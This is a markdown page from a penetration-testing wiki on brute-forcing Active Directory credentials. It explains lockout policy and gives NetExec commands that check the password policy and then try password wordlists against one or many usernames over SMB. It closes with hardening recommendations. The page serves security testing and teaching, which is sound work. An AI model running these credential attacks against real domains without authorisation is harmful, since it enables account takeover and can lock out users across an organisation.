---
layout: default
title: Brute-force
parent: Active Directory
nav_order: 2
permalink: /ad/bruteforce/
---

# Brute-force
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

{: .warning }
> This exploit can **lock** a large amount of - or even all - domain accounts. Be careful to **not perform to much attemps** on the same usernames or ensure to **know the enforced password policy** first.

## Vulnerability

Brute-forcing an Active Directory domain consist in trying a large amount of password for one or multiple usernames until finding legit credentials.

The main issue is that it is possible to enforce password policy on Active Directory, including following options which will be interesting for this exploit.

1. Reset Account Lockout Counter (minutes).
2. Account Lockout Threshold (number of attempts).

If option `2` is set to `None`, you can perform brute-force without taking the risk to lock accounts. Otherwise, the account will be locked during the time stated by the option `1`, after have tried to authenticate on the same username the number of attempts stated by the option `2`.

## Exploit

First, you will need to know the password policy enforced on the domain to prevent any account lockout. If you already have a domain joined account, you can simply kindly ask.

```bash
# With NetExec.
nxc smb -d $domain -u $username -p $password --pass-pol

# From a domain joined computer with ActiveDirectory PowerShell module.
Get-ADDefaultDomainPasswordPolicy

# From a domain joined computer with native PowerShell.
net accounts
```

If *Account Lockout Threshold* is set to `None`, prepare your wordlists. Otherwise, prefer doing [Password Spraying](/ad/spraying/).

```bash
# Try multiple passwords with the same username.
nxc smb -d $domain -u $username -p passwords.txt

# Try multiple passwords for every username.
nxc smb -d $domain -u usernames.txt -p passwords.txt
```

## Recommendations

- [ ] Use strong passwords that are not easily brute-forceable.
- [ ] Enfore strict password policies with account lockout threshold.
- [ ] Do not reuse passwords from a system to another.